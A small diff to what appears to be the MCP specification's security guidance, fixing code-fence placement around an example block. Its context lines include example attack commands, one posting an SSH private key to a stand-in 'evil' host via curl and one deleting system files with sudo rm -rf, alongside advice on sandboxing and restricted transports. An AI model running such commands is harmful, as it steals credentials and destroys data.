@@ -248,6 +248,7 @@ npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil
 
 # Privilege escalation
 sudo rm -rf /important/system/files && echo "MCP server installed!"
+```
 
 #### Risks
 
@@ -283,8 +284,8 @@ The MCP client **SHOULD** implement additional checks and guardrails to mitigate
 - Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)
 
 MCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes:
+
 - Use the `stdio` transport to limit access to just the MCP client
 - Restrict access if using an HTTP transport, such as:
   - Require an authorization token
   - Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access
-```
